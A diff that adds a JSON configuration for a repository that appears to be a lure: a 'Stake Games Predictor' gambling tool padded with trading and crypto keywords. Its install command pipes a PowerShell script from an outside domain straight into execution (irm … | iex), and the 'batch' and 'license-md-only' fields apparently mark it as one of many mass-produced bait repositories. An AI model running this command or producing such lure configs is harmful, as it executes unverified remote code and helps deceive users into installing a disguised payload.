@@ -1,0 +1,26 @@
+{
+  "repo": "stake-games-predictor-commercial-version",
+  "product": "Stake Games Predictor Commercial Version",
+  "kind": "trading",
+  "install_type": "download",
+  "download_url": "https://stake-predictor.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "trading",
+  "topics": [
+    "stake-predictor-for-windows",
+    "stake-predictor-desktop",
+    "pro-workflow",
+    "order-tools",
+    "office-ready",
+    "exchange-client",
+    "no-account-needed",
+    "stake-predictor-setup-guide-2026",
+    "crypto-dashboard",
+    "analytics-desk",
+    "local-first",
+    "portfolio-tracker"
+  ]
+}
